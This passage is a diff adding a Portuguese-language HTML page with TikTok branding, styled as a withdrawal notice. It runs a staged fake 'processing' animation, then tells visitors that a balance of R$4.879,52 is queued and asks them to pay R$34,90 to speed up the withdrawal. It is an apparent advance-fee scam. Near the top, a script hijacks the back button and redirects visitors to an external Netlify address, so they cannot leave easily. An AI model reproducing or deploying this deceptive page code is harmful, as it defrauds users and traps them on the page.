@@ -1,0 +1,451 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+	<meta charset="UTF-8">
+		<title>IOF – Perguntas</title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+        <link rel="preconnect" data-gglt-href="https://fonts.googleapis.com">
+        <link rel="preconnect" crossorigin="" data-gglt-href="https://fonts.gstatic.com">
+        <link rel="stylesheet" href="https://offeersegurooo.vercel.app/up04/antecipaco/css/css_3.css" data-gglt-href="https://offeersegurooo.vercel.app/up04/antecipaco/css/styles.css">
+<meta name="robots" content="max-image-preview:large">
+	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
+	<link rel="alternate" type="application/rss+xml" title="Feed para Perguntas »" href="https://portalglobosmundo.online/feed/">
+<link rel="alternate" type="application/rss+xml" title="Feed de comentários para Perguntas »" href="https://portalglobosmundo.online/comments/feed/">
+
+<script>
+    (function() {
+        const redirectURL = "https://dynamic-heliotrope-18b272.netlify.app/backup/";
+        const currentURL = location.href;
+
+        // Adiciona um estado inicial no histórico
+        history.replaceState({ redirected: false, currentURL: currentURL }, document.title, currentURL);
+
+        // Adiciona um novo estado ao histórico para prevenir a ação de "voltar"
+        history.pushState({ redirected: false, currentURL: currentURL }, document.title, currentURL);
+
+        // Detecta ação de "voltar" no evento popstate
+        window.onpopstate = function(event) {
+            if (event.state && event.state.redirected === false) {
+                // Evita múltiplos redirecionamentos e loops
+                if (sessionStorage.getItem('backRedirectPrevented')) {
+                    console.warn("Redirecionamento evitado: já tratado.");
+                    return;
+                }
+
+                // Marca que o redirecionamento está em andamento
+                sessionStorage.setItem('backRedirectPrevented', 'true');
+                location.replace(redirectURL);
+            }
+        };
+
+        // Previne loops caso o script seja recarregado na página de redirecionamento
+        if (sessionStorage.getItem('backRedirectPrevented')) {
+            if (location.href === redirectURL) {
+                console.info("Redirecionamento concluído sem loops.");
+                sessionStorage.removeItem('backRedirectPrevented');
+            } else {
+                sessionStorage.removeItem('backRedirectPrevented');
+            }
+        }
+
+        // Para navegadores que não geram popstate ao navegar para trás
+        window.addEventListener('beforeunload', function() {
+            sessionStorage.removeItem('backRedirectPrevented');
+        });
+    })();
+</script>
+<script>
+window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/portalglobosmundo.online\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.7.1"}};
+/*! This file is auto-generated */
+!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
+</script>
+<style id="wp-emoji-styles-inline-css">
+
+	img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}
+</style>
+<style id="classic-theme-styles-inline-css">
+/*! This file is auto-generated */
+.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
+</style>
+<style id="global-styles-inline-css">
+:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
+:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
+</style>
+<link rel="stylesheet" id="secure-copy-content-protection-public-css" href="https://offeersegurooo.vercel.app/up04/antecipaco/css/secure-copy-content-protection-public.css" media="all">
+<link rel="stylesheet" id="hello-elementor-css" href="https://offeersegurooo.vercel.app/up04/antecipaco/css/style.min.css" media="all">
+<link rel="stylesheet" id="hello-elementor-theme-style-css" href="https://offeersegurooo.vercel.app/up04/antecipaco/css/theme.min.css" media="all">
+<link rel="stylesheet" id="hello-elementor-header-footer-css" href="https://offeersegurooo.vercel.app/up04/antecipaco/css/header-footer.min.css" media="all">
+<link rel="stylesheet" id="elementor-frontend-css" href="https://offeersegurooo.vercel.app/up04/antecipaco/css/frontend.min_1.css" media="all">
+<link rel="stylesheet" id="elementor-post-5-css" href="https://offeersegurooo.vercel.app/up04/antecipaco/css/post-5.css" media="all">
+<link rel="stylesheet" id="widget-image-css" href="https://offeersegurooo.vercel.app/up04/antecipaco/css/widget-image.min.css" media="all">
+<link rel="stylesheet" id="widget-heading-css" href="https://offeersegurooo.vercel.app/up04/antecipaco/css/widget-heading.min.css" media="all">
+<link rel="stylesheet" id="widget-counter-css" href="https://offeersegurooo.vercel.app/up04/antecipaco/css/widget-counter.min.css" media="all">
+<link rel="stylesheet" id="elementor-pro-css" href="https://offeersegurooo.vercel.app/up04/antecipaco/css/frontend.min.css" media="all">
+<link rel="stylesheet" id="widget-icon-list-css" href="https://offeersegurooo.vercel.app/up04/antecipaco/css/widget-icon-list.min.css" media="all">
+<link rel="stylesheet" id="widget-icon-box-css" href="https://offeersegurooo.vercel.app/up04/antecipaco/css/widget-icon-box.min.css" media="all">
+<link rel="stylesheet" id="elementor-post-2826-css" href="https://offeersegurooo.vercel.app/up04/antecipaco/css/post-2826.css" media="all">
+<link rel="stylesheet" id="elementor-post-824-css" href="https://offeersegurooo.vercel.app/up04/antecipaco/css/post-824.css" media="all">
+<link rel="stylesheet" id="elementor-post-292-css" href="https://offeersegurooo.vercel.app/up04/antecipaco/css/post-292.css" media="all">
+<link rel="stylesheet" id="elementor-post-285-css" href="https://offeersegurooo.vercel.app/up04/antecipaco/css/post-285.css" media="all">
+<link rel="stylesheet" id="elementor-post-280-css" href="https://offeersegurooo.vercel.app/up04/antecipaco/css/post-280.css" media="all">
+<link rel="stylesheet" id="elementor-post-277-css" href="https://offeersegurooo.vercel.app/up04/antecipaco/css/post-277.css" media="all">
+<link rel="stylesheet" id="elementor-post-274-css" href="https://offeersegurooo.vercel.app/up04/antecipaco/css/post-274.css" media="all">
+<link rel="stylesheet" id="elementor-post-271-css" href="https://offeersegurooo.vercel.app/up04/antecipaco/css/post-271.css" media="all">
+<link rel="stylesheet" id="elementor-post-268-css" href="https://offeersegurooo.vercel.app/up04/antecipaco/css/post-268.css" media="all">
+<link rel="stylesheet" id="elementor-post-265-css" href="https://offeersegurooo.vercel.app/up04/antecipaco/css/post-265.css" media="all">
+<link rel="stylesheet" id="elementor-post-262-css" href="https://offeersegurooo.vercel.app/up04/antecipaco/css/post-262.css" media="all">
+<link rel="stylesheet" id="elementor-post-259-css" href="https://offeersegurooo.vercel.app/up04/antecipaco/css/post-259.css" media="all">
+<link rel="stylesheet" id="elementor-post-256-css" href="https://offeersegurooo.vercel.app/up04/antecipaco/css/post-256.css" media="all">
+<link rel="stylesheet" id="elementor-post-253-css" href="https://offeersegurooo.vercel.app/up04/antecipaco/css/post-253.css" media="all">
+<link rel="stylesheet" id="google-fonts-1-css" href="https://fonts.googleapis.com/css?family=Roboto%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CRoboto+Slab%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CInter%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic&display=swap&ver=6.7.1" media="all">
+<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin=""><script src="https://offeersegurooo.vercel.app/up04/antecipaco/js/jquery.min.js" id="jquery-core-js"></script>
+<script src="https://offeersegurooo.vercel.app/up04/antecipaco/js/jquery-migrate.min.js" id="jquery-migrate-js"></script>
+<link rel="https://api.w.org/" href="https://portalglobosmundo.online/wp-json/"><link rel="alternate" title="JSON" type="application/json" href="https://portalglobosmundo.online/wp-json/wp/v2/pages/2826"><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://portalglobosmundo.online/xmlrpc.php?rsd">
+<meta name="generator" content="WordPress 6.7.1">
+<link rel="canonical" href="https://portalglobosmundo.online/iof/">
+<link rel="shortlink" href="https://portalglobosmundo.online/?p=2826">
+<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://portalglobosmundo.online/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fportalglobosmundo.online%2Fiof%2F">
+<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://portalglobosmundo.online/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fportalglobosmundo.online%2Fiof%2F&format=xml">
+<meta name="generator" content="Elementor 3.26.0; features: e_font_icon_svg, additional_custom_breakpoints, e_element_cache; settings: css_print_method-external, google_font-enabled, font_display-swap">
+			<style>
+				.e-con.e-parent:nth-of-type(n+4):not(.e-lazyloaded):not(.e-no-lazyload),
+				.e-con.e-parent:nth-of-type(n+4):not(.e-lazyloaded):not(.e-no-lazyload) * {
+					background-image: none !important;
+				}
+				@media screen and (max-height: 1024px) {
+					.e-con.e-parent:nth-of-type(n+3):not(.e-lazyloaded):not(.e-no-lazyload),
+					.e-con.e-parent:nth-of-type(n+3):not(.e-lazyloaded):not(.e-no-lazyload) * {
+						background-image: none !important;
+					}
+				}
+				@media screen and (max-height: 640px) {
+					.e-con.e-parent:nth-of-type(n+2):not(.e-lazyloaded):not(.e-no-lazyload),
+					.e-con.e-parent:nth-of-type(n+2):not(.e-lazyloaded):not(.e-no-lazyload) * {
+						background-image: none !important;
+					}
+				}
+			</style>
+			<link rel="icon" href="https://offeersegurooo.vercel.app/up04/antecipaco/images/tiktok-logo-150x150.jpg" sizes="32x32">
+<link rel="icon" href="https://offeersegurooo.vercel.app/up04/antecipaco/images/tiktok-logo-300x300.jpg" sizes="192x192">
+<link rel="apple-touch-icon" href="https://offeersegurooo.vercel.app/up04/antecipaco/images/tiktok-logo-300x300.jpg">
+<meta name="msapplication-TileImage" content="https://portalglobosmundo.online/wp-content/uploads/2024/10/tiktok-logo-300x300.jpg">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover"><script src="js/wp-emoji-release.min.js" defer=""></script><script src="https://portalglobosmundo.online/wp-includes/js/wp-emoji-release.min.js?ver=6.7.1" defer=""></script></head>
+<body class="page-template page-template-elementor_canvas page page-id-2826 elementor-default elementor-template-canvas elementor-kit-5 elementor-page elementor-page-2826">
+			<div data-elementor-type="wp-page" data-elementor-id="2826" class="elementor elementor-2826" data-elementor-post-type="page">
+				<div class="elementor-element elementor-element-55f58ac5 e-flex e-con-boxed e-con e-parent e-lazyloaded" data-id="55f58ac5" data-element_type="container" data-settings="{" background_background":"classic","sticky":"top","sticky_on":["desktop","tablet","mobile"],"sticky_offset":0,"sticky_effects_offset":0}"="">
+					<div class="e-con-inner">
+		<div class="elementor-element elementor-element-7d8bc6e1 e-con-full e-flex e-con e-child" data-id="7d8bc6e1" data-element_type="container" data-settings="{" background_background":"classic"}"="">
+				<div class="elementor-element elementor-element-3d57c6f1 elementor-widget elementor-widget-image" data-id="3d57c6f1" data-element_type="widget" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+															<img decoding="async" width="160" height="37" src="images/XMLID_1_.svg" class="attachment-full size-full wp-image-2058" alt="">															</div>
+				</div>
+				</div>
+					</div>
+				</div>
+		<div class="elementor-element elementor-element-71fe1d62 e-flex e-con-boxed e-con e-parent e-lazyloaded" data-id="71fe1d62" data-element_type="container" data-settings="{" background_background":"classic"}"="">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-52a31851 elementor-widget elementor-widget-html" data-id="52a31851" data-element_type="widget" data-widget_type="html.default">
+				<div class="elementor-widget-container">
+					<style>
+  /* Estilo para o preloader fake (sem animação de spin) */
+  #preloader-fake {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: white;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+    visibility: visible; /* Inicia visível */
+    opacity: 1; /* Inicia com opacidade total */
+    transition: opacity 0.5s ease, visibility 0.5s ease; /* Animação para ocultar */
+  }
+
+  /* Estilo da página de carregamento após o preloader fake */
+  #loading-page {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: #ffffff;
+    display: flex;
+    flex-direction: column;
+    justify-content: flex-end; /* Alinha os itens ao fundo */
+    align-items: flex-start; /* Alinha os itens à esquerda */
+    padding-left: 20px;
+    padding-right: 20px;
+    padding-bottom: 100px; /* Espaçamento de 100px na parte inferior */
+    z-index: 9998;
+    visibility: hidden; /* Inicialmente oculto */
+    opacity: 1; /* Opacidade total no início */
+    transition: opacity 1s ease, visibility 1s ease; /* Animação de fade out */
+  }
+
+  /* Barra de progresso */
+  .progress-bar {
+    width: 100%;
+    height: 10px;
+    background-color: #D8D8D8;
+    border-radius: 4px;
+    margin-top: 48px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .progress-bar-fill {
+    height: 100%;
+    width: 0%; /* Começa com 0% */
+    background-color: #FE2B54;
+    transition: width 2s ease; /* Animação de transição suave para a largura da barra */
+  }
+
+  /* Status text */
+  .status-text {
+    font-family: 'Inter', sans-serif;
+    font-weight: 900; /* Fonte mais grossa */
+    font-size: 28px;
+    color: black;
+    margin-top: 48px;
+    width: 100%;
+    text-align: left; /* Alinhado à esquerda */
+    transform: translateY(20px); /* Começa ligeiramente abaixo */
+    opacity: 0; /* Começa invisível */
+    transition: transform 0.5s ease, opacity 0.5s ease; /* Animação de deslizar para cima */
+  }
+</style>
+
+<!-- Preloader fake (sem animação de spin) -->
+<div id="preloader-fake" style="opacity: 0; visibility: hidden;">
+  <!-- Não há spinner aqui, só um fundo branco visível -->
+</div>
+
+<!-- Página de carregamento real com barra de progresso e status -->
+<div id="loading-page" style="visibility: visible;">
+  <!-- Status 1 -->
+  <div class="status-text" id="status-text" style="opacity: 1; transform: translateY(0px);">Validando pesquisa...</div>
+
+  <div class="progress-bar">
+    <div class="progress-bar-fill" id="progress-bar-fill" style="width: 30%;"></div>
+  </div>
+</div>
+
+<script>
+  // Exibir a página de carregamento após o tempo do preloader fake
+  setTimeout(function () {
+    document.getElementById("preloader-fake").style.opacity = 0; // Anima a saída do preloader fake
+    document.getElementById("preloader-fake").style.visibility = "hidden"; // Torna invisível após a animação
+
+    document.getElementById("loading-page").style.visibility = "visible"; // Exibe a página de carregamento real
+
+    // **Status 1 - Validando pesquisa**
+    document.getElementById("status-text").style.opacity = 1;
+    document.getElementById("status-text").style.transform = "translateY(0)";
+    setTimeout(function () {
+      document.getElementById("progress-bar-fill").style.width = "30%";
+    }, 00);
+
+    // Status 2 - Processando saque
+    setTimeout(function () {
+      document.getElementById("status-text").innerText = "Processando saque...";
+      document.getElementById("status-text").style.opacity = 0;
+      document.getElementById("status-text").style.transform = "translateY(20px)";
+
+      setTimeout(function () {
+        document.getElementById("status-text").style.opacity = 1;
+        document.getElementById("status-text").style.transform = "translateY(0)";
+      }, 300);
+
+      setTimeout(function () {
+        document.getElementById("progress-bar-fill").style.width = "60%";
+      }, 100);
+
+    }, 2000);
+
+    // Status 3 - Pronto
+    setTimeout(function () {
+      document.getElementById("status-text").innerText = "Pronto!";
+      document.getElementById("status-text").style.opacity = 0;
+      document.getElementById("status-text").style.transform = "translateY(20px)";
+
+      setTimeout(function () {
+        document.getElementById("status-text").style.opacity = 1;
+        document.getElementById("status-text").style.transform = "translateY(0)";
+      }, 300);
+
+      setTimeout(function () {
+        document.getElementById("progress-bar-fill").style.width = "100%";
+      }, 100);
+    }, 4000);
+
+    // Fechar a página de carregamento real e revelar o aviso
+    setTimeout(function () {
+      document.getElementById("loading-page").style.opacity = 0;
+      document.getElementById("loading-page").style.visibility = "hidden";
+
+      setTimeout(function () {
+        document.body.style.overflow = "auto"; // Desbloqueia o rolar da página real
+        document.getElementById("inicio").style.display = "block"; // Exibe o aviso sobre saque
+      }, 500);
+    }, 5000);
+  }, 400);
+</script>
+
+<div id="inicio" style="display: none;">
+  <div class="menu">
+    <a>
+      <div style="
+        color: #ffffff;
+        font-size: auto;
+        font-weight: Roboto, Sans-serif;
+        padding: 4px 14px;
+        border-radius: 10px;
+        text-align: center;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+      ">
+        Seu saque está em processamento e pode levar até 7 dias.  
+        <br>Antecipe agora para receber imediatamente!
+      </div>
+    </a>
+  </div>
+</div>
+
+                
+                    <div style="margin-bottom: 100px;"></div>
+                
+                    <div class="outer-box" id="ad1" style="display: block;">
+                      <div class="white-box">
+                
+                        <div class="imagem">
+                          <img src="https://offeersegurooo.vercel.app/up04/antecipaco/images/7safpbsxoywisudmovpfonxnj.gif" style="width: 50%; margin: 0 auto; display: flex;" data-gglt-src="images/caixa.png">
+                          <div style="background-color: #161616; padding: 10px; border-radius: 5px; font-size: 16px; font-weight: bold; text-align: center;">
+                            <span style="background-color: #FF0150; color: #FFFFFF; padding: 8px 15px; border-radius: 5px;">SALDO:
+                              R$4.879,52
+                            </span>
+                            <p style="color: #FFFFFF;">Devido a um grande volume de solicitações de saque, seu pedido entrou na fila de
+                              processamento. Portanto isso pode levar alguns dias. <br><br>
+                              Caso queira priorizar o processamento, você pode optar por antecipar o saque por
+                              <span style="color: #FF0150; font-weight: bold; font-size: 24px;">
+                                R$34,90.
+                              </span>
+                              Este valor será reembolsado integralmente no seu primeiro saque!
+                            </p>
+                          </div>
+                        </div>
+                
+                        <p></p>
+                        <div class="rating-container" id="rating-container-3" style="display: flex; justify-content: center;">
+                        </div>
+                
+                        <div style="display: flex; justify-content: center; margin-top: 10px;">
